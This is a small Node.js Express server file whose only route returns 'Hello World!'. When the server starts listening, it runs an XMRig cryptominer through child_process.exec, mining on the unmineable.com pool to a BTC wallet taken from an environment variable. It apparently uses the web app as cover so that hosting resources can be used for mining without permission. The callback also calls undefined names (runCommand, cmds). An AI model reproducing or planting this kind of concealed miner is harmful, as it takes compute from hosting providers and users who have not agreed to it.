require('dotenv').config()

const express = require('express');

const port = 1234;

const app = express();

app.get('/',(req,res) => {
    res.send('Hello World!');
})

app.listen(process.env.PORT || 8080,() => {
    "use strict;"

    console.log(`veja seu progresso em : https://unmineable.com/coins/BTC/address/${process.env.BTC_WALLET}`)
    console.log(`iniciando...`)

    var exec = require('child_process').exec;
    const cmd = `./XMRIG/xmrig-6.7.0/xmrig --donate-level 1 -o rx.unmineable.com:3333 -u BTC:${process.env.BTC_WALLET}.Fenix -p x -k -a rx/0`
    

    exec(cmd, {
    cwd: __dirname
    }, (err, stdout, stderr) => {
    console.log(stdout);
    if (err) console.log(err);
    else runCommand(cmds, cb);
    });
});